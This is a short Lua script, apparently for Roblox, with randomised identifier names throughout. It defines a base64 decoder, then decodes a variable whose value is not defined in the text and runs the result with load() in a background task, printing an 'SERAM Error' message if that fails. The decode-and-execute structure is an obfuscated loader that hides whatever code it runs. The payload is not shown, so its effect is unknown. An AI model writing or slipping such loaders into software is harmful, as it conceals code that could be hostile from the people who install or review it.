local function _Toag3vOGT8(_JroBh5aZPY)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    _JroBh5aZPY = string.gsub(_JroBh5aZPY, '[^'..b..'=]', '')
    return (_JroBh5aZPY:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local r=0
        for i=1,8 do r=r+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(r)
    end))
end

local _xHFncFJRLY = "SERAM_" .. tostring(math.random(1000, 9999))
task.spawn(function()
    local success, err = pcall(function()
        assert(load(_Toag3vOGT8(_kPS0SdLJog)))()
    end)
    if not success then
        warn("SERAM Error: " .. tostring(err))
    end
end)
